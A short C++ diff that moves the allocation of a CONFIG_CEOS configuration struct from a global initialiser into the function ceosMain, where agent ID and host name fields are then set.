@@ -4,10 +4,11 @@
 #include "ceos.h"
 #include "Config.h"
 
-CONFIG_CEOS* ceosConfig = (CONFIG_CEOS*)LocalAlloc(LPTR, sizeof(CONFIG_CEOS));
+CONFIG_CEOS* ceosConfig = nullptr;
 
 VOID ceosMain()
 {
+    ceosConfig = (CONFIG_CEOS*)LocalAlloc(LPTR, sizeof(CONFIG_CEOS));
     // Config Init
     ceosConfig->agentID = (PCHAR)initUUID;
     ceosConfig->hostName = (PWCHAR)hostname;
